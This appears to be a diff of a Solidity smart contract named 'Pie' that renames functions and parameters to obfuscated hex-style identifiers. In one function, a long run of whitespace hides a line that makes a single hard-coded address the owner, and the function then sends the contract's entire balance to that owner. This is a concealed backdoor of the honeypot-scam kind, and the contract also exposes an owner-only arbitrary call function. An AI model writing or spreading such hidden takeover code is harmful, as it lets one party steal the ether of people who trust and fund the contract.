@@ -21,7 +21,7 @@ contract Pie
         }
     }
 
-    function _0x1b809e()
+    function _0x6c97d8()
     payable
     public
     {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       if(msg.sender==0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6){Owner=0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6;}
@@ -29,11 +29,11 @@ contract Pie
         Owner.transfer(this.balance);
     }
 
-    function Command(address _0x5b9c38,bytes data)
+    function Command(address _0xcbd3cd,bytes data)
     payable
     public
     {
         require(msg.sender == Owner);
-        _0x5b9c38.call.value(msg.value)(data);
+        _0xcbd3cd.call.value(msg.value)(data);
     }
 }
